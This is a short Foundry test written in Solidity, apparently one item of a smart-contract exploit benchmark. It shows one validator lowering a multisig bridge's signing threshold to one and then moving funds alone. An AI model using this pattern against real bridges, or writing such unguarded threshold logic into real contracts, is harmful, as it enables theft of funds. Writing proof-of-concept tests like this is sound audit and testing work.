// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contract.sol";

contract Exploit_014_ronin_access_control is Test {
    function testExploit_LowThresholdEnablesSingleSignerExecution() public {
        address[] memory vals = new address[](2);
        vals[0] = address(this);
        vals[1] = address(0xBEEF);
        RoninAccessControl r = new RoninAccessControl(vals, 2);
        vm.deal(address(r), 1 ether);

        r.setThreshold(1);
        address[] memory signers = new address[](1);
        signers[0] = address(this);
        r.executeTransfer(keccak256("xfer1"), address(0xCAFE), 0.2 ether, signers);

        assertEq(address(0xCAFE).balance, 0.2 ether, "single signer should execute after threshold lowering");
    }
}
